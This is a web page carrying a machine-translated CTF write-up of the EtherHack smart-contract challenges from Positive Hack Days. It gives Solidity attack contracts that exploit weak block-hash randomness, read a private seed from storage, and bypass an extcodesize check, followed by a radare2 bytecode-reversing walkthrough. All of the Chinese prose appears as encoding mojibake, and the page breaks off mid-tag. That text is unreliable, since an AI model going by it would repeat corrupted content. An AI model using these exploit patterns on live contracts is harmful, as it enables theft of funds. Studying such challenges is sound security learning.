<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>ğŸ§›ğŸ½ ğŸ‘©ğŸ»â€âš–ï¸ ğŸ›€ å‘ç°æ™ºèƒ½åˆçº¦ä¸­çš„æ¼æ´ï¼šç§¯æHack Daysçš„EtherHackè¯„è®º8 ğŸ‘¨ğŸ¿ ğŸ‘¨â€ğŸ“ ğŸ²</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="ä»Šå¹´ï¼ŒPHDaysé¦–æ¬¡ä¸¾åŠäº†ä¸€åœºåä¸ºEtherHackçš„æ¯”èµ›ã€‚ å‚ä¸è€…å¯»æ‰¾æ™ºèƒ½åˆçº¦ä¸­çš„æ¼æ´ä»¥æé«˜é€Ÿåº¦ã€‚ åœ¨æœ¬æ–‡ä¸­ï¼Œæˆ‘ä»¬å°†å‘æ‚¨ä»‹ç»æ¯”èµ›çš„ä»»åŠ¡ä»¥åŠè§£å†³è¿™äº›é—®é¢˜çš„å¯èƒ½æ–¹æ³•ã€‚ 

 Azino 777 
 èµ¢å½©ç¥¨å¹¶æ‰“ç ´åº•æ± ï¼ 
 å‰ä¸‰ä¸ªä»»åŠ¡ä¸ä¼ªéšæœºæ•°ç”Ÿæˆä¸­çš„é”™è¯¯æœ‰å…³ï¼Œæˆ‘ä»¬æœ€è¿‘è°ˆåˆ°äº†è¿™äº›é—®é¢˜ï¼š é¢„æµ‹ä»¥å¤ªåŠæ™ºèƒ½...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>å‘ç°æ™ºèƒ½åˆçº¦ä¸­çš„æ¼æ´ï¼šç§¯æHack Daysçš„EtherHackè¯„è®º8</h1><div class="post__body post__body_full"><div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/company/pt/blog/414959/"> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u="><img src="https://habrastorage.org/getpro/habr/post_images/182/a00/fef/182a00fef4fbdd4677afb585de886e1e.jpg" alt="å›¾ç‰‡"></a> <br><br> ä»Šå¹´ï¼ŒPHDaysé¦–æ¬¡ä¸¾åŠäº†ä¸€åœºåä¸º<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">EtherHack</a>çš„æ¯”èµ›ã€‚ å‚ä¸è€…å¯»æ‰¾æ™ºèƒ½åˆçº¦ä¸­çš„æ¼æ´ä»¥æé«˜é€Ÿåº¦ã€‚ åœ¨æœ¬æ–‡ä¸­ï¼Œæˆ‘ä»¬å°†å‘æ‚¨ä»‹ç»æ¯”èµ›çš„ä»»åŠ¡ä»¥åŠè§£å†³è¿™äº›é—®é¢˜çš„å¯èƒ½æ–¹æ³•ã€‚ <a name="habracut"></a><br><br><h2>  Azino 777 </h2><br><h4> èµ¢å½©ç¥¨å¹¶æ‰“ç ´åº•æ± ï¼ </h4><br> å‰ä¸‰ä¸ªä»»åŠ¡ä¸ä¼ªéšæœºæ•°ç”Ÿæˆä¸­çš„é”™è¯¯æœ‰å…³ï¼Œæˆ‘ä»¬æœ€è¿‘è°ˆåˆ°äº†è¿™äº›é—®é¢˜ï¼š <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">é¢„æµ‹ä»¥å¤ªåŠæ™ºèƒ½åˆçº¦ä¸­çš„éšæœºæ•°</a> ã€‚ ç¬¬ä¸€é¡¹ä»»åŠ¡åŸºäºä¼ªéšæœºæ•°ç”Ÿæˆå™¨ï¼ˆPRNGï¼‰ï¼Œå®ƒä½¿ç”¨æœ€åä¸€å—çš„å“ˆå¸Œä½œä¸ºç†µçš„æ¥æºæ¥ç”Ÿæˆéšæœºæ•°ï¼š <br><br><pre><code class="cpp hljs">pragma solidity ^<span class="hljs-number"><span class="hljs-number">0.4</span></span><span class="hljs-number"><span class="hljs-number">.16</span></span>; contract Azino777 { <span class="hljs-function"><span class="hljs-function">function </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">spin</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(uint256 bet)</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> payable </span></span>{ require(msg.value &gt;= <span class="hljs-number"><span class="hljs-number">0.01</span></span> ether); uint256 num = rand(<span class="hljs-number"><span class="hljs-number">100</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(num == bet) { msg.sender.transfer(<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.balance); } } <span class="hljs-comment"><span class="hljs-comment">//Generate random number between 0 &amp; max uint256 constant private FACTOR = 1157920892373161954235709850086879078532699846656405640394575840079131296399; function rand(uint max) constant private returns (uint256 result){ uint256 factor = FACTOR * 100 / max; uint256 lastBlockNumber = block.number - 1; uint256 hashVal = uint256(block.blockhash(lastBlockNumber)); return uint256((uint256(hashVal) / factor)) % max; } function() public payable {} }</span></span></code> </pre> <br> ç”±äºåŒä¸€å—ä¸­ä»»ä½•äº‹åŠ¡çš„è°ƒç”¨<code>block.blockhash(block.number-1)</code>å‡½æ•°<code>block.blockhash(block.number-1)</code>çš„ç»“æœéƒ½æ˜¯ç›¸åŒçš„ï¼Œå› æ­¤æ”»å‡»è€…å¯ä»¥ä½¿ç”¨å…·æœ‰ç›¸åŒ<code>rand()</code>å‡½æ•°çš„æ¼æ´åˆ©ç”¨åˆåŒé€šè¿‡å†…éƒ¨æ¶ˆæ¯æ¥è°ƒç”¨ç›®æ ‡åˆåŒï¼š <br><br><pre> <code class="cpp hljs"><span class="hljs-function"><span class="hljs-function">function </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">WeakRandomAttack</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(address _target)</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> payable </span></span>{ target = Azino777(_target); } <span class="hljs-function"><span class="hljs-function">function </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">attack</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> </span></span>{ uint256 num = rand(<span class="hljs-number"><span class="hljs-number">100</span></span>); target.spin.value(<span class="hljs-number"><span class="hljs-number">0.01</span></span> ether)(num); }</code> </pre> <br><h2> ç§äººç‘å®‰ </h2><br><h4> æˆ‘ä»¬æ·»åŠ äº†ä¸€ä¸ªæ²¡äººèƒ½è®¡ç®—çš„ç§æœ‰åˆå§‹å€¼ã€‚ </h4><br> æ­¤ä»»åŠ¡æ˜¯ä¸Šä¸€ä¸ªä»»åŠ¡çš„ç¨å¾®å¤æ‚çš„ç‰ˆæœ¬ã€‚ ç§å­å˜é‡è¢«è§†ä¸ºç§æœ‰å˜é‡ï¼Œç”¨äºåç§»å—åºå·ï¼ˆblock.numberï¼‰ï¼Œä»¥ä¾¿è¯¥å—çš„å“ˆå¸Œä¸ä¾èµ–äºå…ˆå‰çš„å—ã€‚ æ¯æ¬¡ä¸‹æ³¨åï¼Œç§å­å°†è¢«é‡å†™ä¸ºæ–°çš„â€œéšæœºâ€åç§»é‡ã€‚ ä¾‹å¦‚ï¼Œåœ¨<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">Slotthereum</a>å½©ç¥¨ä¸­å°±æ˜¯è¿™æ ·ã€‚ <br><br><pre> <code class="cpp hljs">contract PrivateRyan { uint <span class="hljs-keyword"><span class="hljs-keyword">private</span></span> seed = <span class="hljs-number"><span class="hljs-number">1</span></span>; <span class="hljs-function"><span class="hljs-function">function </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">PrivateRyan</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function"> </span></span>{ seed = rand(<span class="hljs-number"><span class="hljs-number">256</span></span>); } <span class="hljs-function"><span class="hljs-function">function </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">spin</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(uint256 bet)</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> payable </span></span>{ require(msg.value &gt;= <span class="hljs-number"><span class="hljs-number">0.01</span></span> ether); uint256 num = rand(<span class="hljs-number"><span class="hljs-number">100</span></span>); seed = rand(<span class="hljs-number"><span class="hljs-number">256</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(num == bet) { msg.sender.transfer(<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.balance); } } <span class="hljs-comment"><span class="hljs-comment">/* ... */</span></span> }</code> </pre> <br> ä¸ä¹‹å‰çš„ä»»åŠ¡ä¸€æ ·ï¼Œé»‘å®¢åªéœ€è¦å°†<code>rand()</code>å‡½æ•°å¤åˆ¶åˆ°åˆçº¦æ¼æ´ä¸­ï¼Œä½†æ˜¯åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå¿…é¡»åœ¨åŒºå—é“¾å¤–éƒ¨è·å–ç§æœ‰å˜é‡ç§å­çš„å€¼ï¼Œç„¶åå°†å…¶ä½œä¸ºå‚æ•°å‘é€ç»™æ¼æ´ã€‚ ä¸ºæ­¤ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨web3åº“ä¸­çš„<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">web3.eth.getStorageAtï¼ˆï¼‰</a>æ–¹æ³•ï¼š <br><br><img src="https://habrastorage.org/getpro/habr/post_images/f54/73b/748/f5473b74840e81cc2bef6c3105401777.png" alt="å›¾ç‰‡"><br><br>  <i>è¯»å–åŒºå—é“¾å¤–éƒ¨çš„åˆåŒå­˜å‚¨ä»¥è·å–åˆå§‹å€¼</i> <br><br> æ”¶åˆ°åˆå§‹å€¼åï¼Œä»…ä¿ç•™å°†å…¶å‘é€ç»™æ¼æ´åˆ©ç”¨ç¨‹åºï¼Œè¿™ä¸ç¬¬ä¸€ä¸ªä»»åŠ¡ä¸­çš„å‡ ä¹ç›¸åŒï¼š <br><br><pre> <code class="cpp hljs">contract PrivateRyanAttack { PrivateRyan target; uint <span class="hljs-keyword"><span class="hljs-keyword">private</span></span> seed; <span class="hljs-function"><span class="hljs-function">function </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">PrivateRyanAttack</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(address _target, uint _seed)</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> payable </span></span>{ target = PrivateRyan(_target); seed = _seed; } <span class="hljs-function"><span class="hljs-function">function </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">attack</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> </span></span>{ uint256 num = rand(<span class="hljs-number"><span class="hljs-number">100</span></span>); target.spin.value(<span class="hljs-number"><span class="hljs-number">0.01</span></span> ether)(num); } <span class="hljs-comment"><span class="hljs-comment">/* ... */</span></span> }</code> </pre> <br><h2> å‘½è¿ä¹‹è½® </h2><br><h4> è¯¥å½©ç¥¨ä½¿ç”¨åç»­å—çš„å“ˆå¸Œã€‚ å°è¯•è®¡ç®—ä¸€ä¸‹ï¼ </h4><br> åœ¨æ­¤ä»»åŠ¡ä¸­ï¼Œæœ‰å¿…è¦åœ¨ä¸‹æ³¨åæ‰¾å‡ºå…¶ç¼–å·å­˜å‚¨åœ¨æ¸¸æˆç»“æ„ä¸­çš„åŒºå—çš„å“ˆå¸Œå€¼ã€‚ ç„¶ååœ¨ä¸‹ä¸€æ¬¡ä¸‹æ³¨åæå–æ­¤å“ˆå¸Œä»¥ç”Ÿæˆéšæœºæ•°ã€‚ <br><br><pre> <code class="cpp hljs">Pragma solidity ^<span class="hljs-number"><span class="hljs-number">0.4</span></span><span class="hljs-number"><span class="hljs-number">.16</span></span>; contract WheelOfFortune { Game[] <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> games; <span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">struct</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">Game</span></span></span><span class="hljs-class"> {</span></span> address player; uint id; uint bet; uint blockNumber; } <span class="hljs-function"><span class="hljs-function">function </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">spin</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(uint256 _bet)</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> payable </span></span>{ require(msg.value &gt;= <span class="hljs-number"><span class="hljs-number">0.01</span></span> ether); uint gameId = games.length; games.length++; games[gameId].id = gameId; games[gameId].player = msg.sender; games[gameId].bet = _bet; games[gameId].blockNumber = block.number; <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (gameId &gt; <span class="hljs-number"><span class="hljs-number">0</span></span>) { uint lastGameId = gameId - <span class="hljs-number"><span class="hljs-number">1</span></span>; uint num = rand(block.blockhash(games[lastGameId].blockNumber), <span class="hljs-number"><span class="hljs-number">100</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(num == games[lastGameId].bet) { games[lastGameId].player.transfer(<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.balance); } } } <span class="hljs-function"><span class="hljs-function">function </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">rand</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(bytes32 hash, uint max)</span></span></span><span class="hljs-function"> pure </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">private</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">returns</span></span></span><span class="hljs-function"> </span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(uint256 result)</span></span></span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> uint256(keccak256(hash)) % max; } function() <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> payable {} }</code> </pre><br> åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæœ‰ä¸¤ç§å¯èƒ½çš„è§£å†³æ–¹æ¡ˆã€‚ <br><br><ol><li> é€šè¿‡æ¼æ´åˆ©ç”¨åˆåŒä¸¤æ¬¡è°ƒç”¨ç›®æ ‡åˆåŒã€‚ è°ƒç”¨block.blockhashï¼ˆblock.numberï¼‰å‡½æ•°çš„ç»“æœå°†å§‹ç»ˆä¸ºé›¶ã€‚ </li><li> ç­‰å¾…256ä¸ªæ–¹å—è¿›å…¥ï¼Œç„¶åå†ä¸‹æ³¨ã€‚ ç”±äº<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">ä»¥å¤ªåŠè™šæ‹Ÿæœºï¼ˆEVMï¼‰</a>å¯¹å¯ç”¨å—å“ˆå¸Œæ•°çš„<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">é™åˆ¶</a> ï¼Œå› æ­¤å­˜å‚¨çš„å—åºåˆ—å·å“ˆå¸Œå°†ä¸ºé›¶ã€‚ </li></ol><br> åœ¨è¿™ä¸¤ç§æƒ…å†µä¸‹ï¼Œè·èƒœæŠ•æ³¨<code>uint256(keccak256(bytes32(0))) % 100</code>æˆ–â€œ 47â€ã€‚ <br><br><h2> ä¹Ÿè®¸ç»™æˆ‘æ‰“ç”µè¯ </h2><br><h4> è¯¥åˆåŒä¸å–œæ¬¢å…¶ä»–åˆåŒæ‰€ç§°çš„åˆåŒã€‚ </h4><br> ä¿æŠ¤åˆçº¦ä¸è¢«å…¶ä»–åˆçº¦è°ƒç”¨çš„ä¸€ç§æ–¹æ³•æ˜¯ä½¿ç”¨æ±‡ç¼–ç¨‹åºæŒ‡ä»¤EVM <code>extcodesize</code> ï¼Œè¯¥æŒ‡ä»¤åœ¨å…¶åœ°å€å¤„è¿”å›åˆçº¦çš„å¤§å°ã€‚ æ–¹æ³•æ˜¯ä½¿ç”¨æ±‡ç¼–å™¨æ’å…¥å°†æ­¤æŒ‡ä»¤ç”¨äºäº‹åŠ¡å‘é€æ–¹çš„åœ°å€ã€‚ å¦‚æœç»“æœå¤§äºé›¶ï¼Œåˆ™è¯´æ˜äº¤æ˜“çš„å‘é€è€…æ˜¯ä¸€ä¸ªåˆåŒï¼Œå› ä¸ºä»¥å¤ªåŠä¸­çš„æ™®é€šåœ°å€æ²¡æœ‰ä»£ç ã€‚ æ­£æ˜¯æ­¤æ–¹æ³•ç”¨äºæ­¤ä»»åŠ¡ä¸­ï¼Œä»¥é˜²æ­¢å…¶ä»–åˆåŒè°ƒç”¨è¯¥åˆåŒã€‚ <br><br><pre> <code class="cpp hljs">contract CallMeMaybe { <span class="hljs-function"><span class="hljs-function">modifier </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">CallMeMaybe</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function"> </span></span>{ uint32 size; address _addr = msg.sender; assembly { size := extcodesize(_addr) } <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (size &gt; <span class="hljs-number"><span class="hljs-number">0</span></span>) { revert(); } _; } <span class="hljs-function"><span class="hljs-function">function </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">HereIsMyNumber</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function"> CallMeMaybe </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(tx.origin == msg.sender) { revert(); } <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> { msg.sender.transfer(<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.balance); } } function() payable {} }</code> </pre> <br>  <code>tx.origin</code>äº‹åŠ¡<code>tx.origin</code>æŒ‡å‘è¯¥äº‹åŠ¡çš„åŸå§‹åˆ›å»ºè€…ï¼Œè€Œmsg.senderæŒ‡å‘æœ€åä¸€ä¸ªè°ƒç”¨è€…ã€‚ å¦‚æœæˆ‘ä»¬ä»é€šå¸¸çš„åœ°å€å‘é€äº‹åŠ¡ï¼Œåˆ™è¿™äº›å˜é‡å°†ç›¸ç­‰ï¼Œå¹¶ä¸”æœ€ç»ˆå°†å¾—åˆ°<code>revert()</code> ã€‚ å› æ­¤ï¼Œè¦è§£å†³æˆ‘ä»¬çš„é—®é¢˜ï¼Œå¿…é¡»ç»•è¿‡<code>extcodesize</code>æŒ‡ä»¤çš„éªŒè¯ï¼Œä»¥ä¾¿<code>tx.origin</code>å’Œ<code>msg.sender</code>ä¸åŒã€‚ å¹¸è¿çš„æ˜¯ï¼ŒEVMä¸­æœ‰ä¸€ä¸ªä¸é”™çš„åŠŸèƒ½å¯ä»¥å¸®åŠ©æ‚¨ï¼š <br><br><img src="https://habrastorage.org/getpro/habr/post_images/9e9/07a/74e/9e907a74eb156cb8380527b50d47a4b8.png" alt="å›¾ç‰‡"><br><br> ç¡®å®ï¼Œå½“åˆšåˆšæ”¾ç½®çš„åˆåŒåœ¨æ„é€ å‡½æ•°ä¸­è°ƒç”¨å…¶ä»–åˆåŒæ—¶ï¼Œå®ƒæœ¬èº«è¿˜ä¸å­˜åœ¨äºåŒºå—é“¾ä¸­ï¼Œå®ƒä»…å……å½“é’±åŒ…ã€‚ å› æ­¤ï¼Œä»£ç æœªç»‘å®šåˆ°æ–°åˆåŒï¼Œå¹¶ä¸”extcodesizeå°†è¿”å›é›¶ï¼š <br><br><pre> <code class="cpp hljs"> contract CallMeMaybeAttack { <span class="hljs-function"><span class="hljs-function">function </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">CallMeMaybeAttack</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(CallMeMaybe _target)</span></span></span><span class="hljs-function"> payable </span></span>{ _target.HereIsMyNumber(); } function() payable {} }</code> </pre> <br><h2> é” </h2><br><h4> å¥‡æ€ªçš„æ˜¯ï¼ŒåŸå ¡å·²å…³é—­ã€‚ å°è¯•é€šè¿‡è§£é”åŠŸèƒ½ï¼ˆå­—èŠ‚4å¯†ç ï¼‰è·å–å¯†ç ã€‚ æ¯æ¬¡å°è¯•è§£é”å°†èŠ±è´¹æ‚¨0.5ä¹™é†šã€‚ </h4><br> åœ¨æ­¤ä»»åŠ¡ä¸­ï¼Œæ²¡æœ‰ä¸ºå‚ä¸è€…æä¾›ä»£ç -ä»–ä»¬å¿…é¡»é€šè¿‡å…¶å­—èŠ‚ç æ¢å¤åˆåŒçš„é€»è¾‘ã€‚ ä¸€ç§é€‰æ‹©æ˜¯ä½¿ç”¨Radare2ï¼Œè¯¥å¹³å°ç”¨äº<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">åæ±‡ç¼–</a>å’Œ<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">è°ƒè¯•EVM</a> ã€‚ <br><br> é¦–å…ˆï¼Œæˆ‘ä»¬å°†å‘å¸ƒä¸€ä¸ªä»»åŠ¡ç¤ºä¾‹å¹¶éšæœºè¾“å…¥ä»£ç ï¼š <br><br><pre> <code class="cpp hljs">await contract.unlock(<span class="hljs-string"><span class="hljs-string">"1337"</span></span>, {value: <span class="hljs-number"><span class="hljs-number">500000000000000000</span></span>}) â†’<span class="hljs-literal"><span class="hljs-literal">false</span></span></code> </pre> <br> å°è¯•å½“ç„¶æ˜¯å¥½çš„ï¼Œä½†æ˜¯æ²¡æœ‰æˆåŠŸã€‚ ç°åœ¨å°è¯•è°ƒè¯•æ­¤äº‹åŠ¡ã€‚ <br><br><pre> <code class="cpp hljs">r2 -a evm -D evm <span class="hljs-string"><span class="hljs-string">"evm://localhost:8545@0xf7dd5ca9d18091d17950b5ecad5997eacae0a7b9cff45fba46c4d302cf6c17b7"</span></span></code> </pre> <br> åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬æŒ‡ç¤ºRadare2ä½¿ç”¨evmæ¶æ„ã€‚ ç„¶åï¼Œè¯¥å·¥å…·è¿æ¥åˆ°ä»¥å¤ªåŠèŠ‚ç‚¹ï¼Œå¹¶åœ¨è™šæ‹Ÿæœºä¸­æ£€ç´¢æ­¤äº‹åŠ¡çš„è·Ÿè¸ªã€‚ ç°åœ¨ï¼Œæœ€åï¼Œæˆ‘ä»¬å‡†å¤‡æ·±å…¥æ¢è®¨EVMå­—èŠ‚ç ã€‚ <br><br> é¦–å…ˆï¼Œæ‚¨éœ€è¦æ‰§è¡Œåˆ†æï¼š <br><br><pre> <code class="cpp hljs">[<span class="hljs-number"><span class="hljs-number">0x00000000</span></span>]&gt; aa [x] Analyze all flags starting with sym. <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">and</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">entry0</span></span></span><span class="hljs-function"> </span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(aa)</span></span></span></span></code> </pre> <br> æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬ä½¿ç”¨pd 1000å‘½ä»¤åæ±‡ç¼–å‰1000æ¡æŒ‡ä»¤ï¼ˆè¿™åº”è¯¥è¶³ä»¥è¦†ç›–æ•´ä¸ªåˆåŒï¼‰ï¼Œå¹¶åˆ‡æ¢ä¸ºä½¿ç”¨VVå‘½ä»¤æŸ¥çœ‹å›¾å½¢ã€‚ <br><br> åœ¨ç”¨<code>solc</code>ç¼–è¯‘çš„EVMå­—èŠ‚ç ä¸­ï¼Œé€šå¸¸æ˜¯åŠŸèƒ½ç®¡ç†å™¨æ’åœ¨ç¬¬ä¸€ä½ã€‚ åŸºäºåŒ…å«å‡½æ•°ç­¾åçš„è°ƒç”¨æ•°æ®çš„å‰å››ä¸ªå­—èŠ‚ï¼ˆå®šä¹‰ä¸º<code>bytes4(sha3(function_name(params)))</code> ï¼Œå‡½æ•°ç®¡ç†å™¨å†³å®šè¦è°ƒç”¨å“ªä¸ªå‡½æ•°ã€‚ æˆ‘ä»¬å¯¹<code>unlock(bytes4)</code>åŠŸèƒ½<code>unlock(bytes4)</code>æ„Ÿå…´è¶£ï¼Œè¯¥åŠŸèƒ½å¯¹åº”äº<code>0x75a4e3a0</code> ã€‚ <br><br> æŒ‰ç…§ä½¿ç”¨sé”®çš„æ‰§è¡Œæµç¨‹ï¼Œæˆ‘ä»¬åˆ°è¾¾å°†<code>callvalue</code>ä¸å€¼<code>0x6f05b59d3b20000</code>æˆ–<code>500000000000000000</code>è¿›è¡Œæ¯”è¾ƒçš„èŠ‚ç‚¹ï¼Œè¯¥å€¼ç­‰äº0.5ä»¥å¤ªï¼š <br><br><pre> <code class="cpp hljs">push8 <span class="hljs-number"><span class="hljs-number">0x6f05b59d3b20000</span></span> callvalue lt</code> </pre> <br> å¦‚æœæä¾›çš„ä»¥å¤ªå¸è¶³å¤Ÿï¼Œé‚£ä¹ˆæˆ‘ä»¬å‘ç°è‡ªå·±å¤„äºä¸€ä¸ªç±»ä¼¼äºæ§åˆ¶ç»“æ„çš„èŠ‚ç‚¹ä¸­ï¼š <br><br><pre> <code class="cpp hljs">push1 <span class="hljs-number"><span class="hljs-number">0x4</span></span> dup4 push1 <span class="hljs-number"><span class="hljs-number">0xff</span></span> <span class="hljs-keyword"><span class="hljs-keyword">and</span></span> lt iszero push2 <span class="hljs-number"><span class="hljs-number">0x1a4</span></span> jumpi</code> </pre> <br> è¯¥ä»£ç å°†å€¼0x4æ”¾åœ¨å †æ ˆçš„é¡¶éƒ¨ï¼Œæ£€æŸ¥ä¸Šé™ï¼ˆè¯¥å€¼ä¸åº”è¶…è¿‡0xffï¼‰ï¼Œå¹¶å°†ltä¸ä»å †æ ˆçš„ç¬¬å››ä¸ªå…ƒç´ ï¼ˆdup4ï¼‰å¤åˆ¶çš„æŸä¸ªå€¼è¿›è¡Œæ¯”è¾ƒã€‚ <br><br> æ»šåŠ¨åˆ°å›¾çš„æœ€åº•éƒ¨ï¼Œæˆ‘ä»¬çœ‹åˆ°ç¬¬å››ä¸ªå…ƒç´ æœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªè¿­ä»£å™¨ï¼Œå¹¶ä¸”æ­¤æ§åˆ¶ç»“æ„æ˜¯ä¸€ä¸ªä¸<code>for(var i=0; i&lt;4; i++):</code>ç›¸å¯¹åº”çš„å¾ªç¯<code>for(var i=0; i&lt;4; i++):</code> <br><br><pre> <code class="cpp hljs">push1 <span class="hljs-number"><span class="hljs-number">0x1</span></span> add swap4</code> </pre> <br> å¦‚æœè€ƒè™‘å¾ªç¯çš„ä¸»ä½“ï¼Œå¾ˆæ˜æ˜¾å®ƒæšä¸¾äº†å››ä¸ªä¼ å…¥çš„å­—èŠ‚ï¼Œå¹¶å¯¹æ¯ä¸ªå­—èŠ‚æ‰§è¡Œä¸€äº›æ“ä½œã€‚ é¦–å…ˆï¼Œå¾ªç¯æ£€æŸ¥ç¬¬nä¸ªå­—èŠ‚æ˜¯å¦å¤§äº0x30ï¼š <br><br><pre> <code class="cpp hljs">push1 <span 